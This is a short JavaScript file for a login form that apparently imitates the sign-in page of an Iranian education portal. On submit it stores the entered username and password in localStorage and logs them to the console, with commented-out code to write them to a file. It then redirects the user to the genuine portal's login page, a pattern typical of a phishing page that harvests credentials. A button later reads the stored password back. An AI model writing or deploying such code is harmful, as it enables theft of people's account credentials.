var userNameInput = document.getElementById('username-me');
var passwordInput = document.getElementById('password-me');
var submitBtn = document.getElementById('submit-me');
var showPass = document.getElementById('show-pass');
var captcha = document.getElementById('captchaResponse');


captcha.addEventListener('keyup', function(){
    if(captcha.value.length == 5){
        submitBtn.removeAttribute('disabled')
        submitBtn.addEventListener("click", function(){
            const infoObj = {
                username:userNameInput.value,
                password:passwordInput.value,
            }
            localStorage.setItem("username", userNameInput.value);
            localStorage.setItem("password", passwordInput.value);
            //dictstring = JSON.stringify(infoObj)
            //var fs = require('fs');
            //fs.writeFile("thing.json", dictstring);
            console.log(infoObj);
            window.location.assign('https://sida.medu.ir/#/login')
        })
    }else{
        submitBtn.setAttribute('disabled', 'disabled');
    }
})
var flag = false;
showPass.addEventListener("click", (event)=>{
    if(!flag){
        userNameInput.value = localStorage.getItem("username");
        passwordInput.type = "text";
        passwordInput.value = localStorage.getItem("password");
        flag = true;
    }else{
        localStorage.clear();
        userNameInput.value = "";
        passwordInput.type = "password";
        passwordInput.value = "";
        flag = false;
    }
})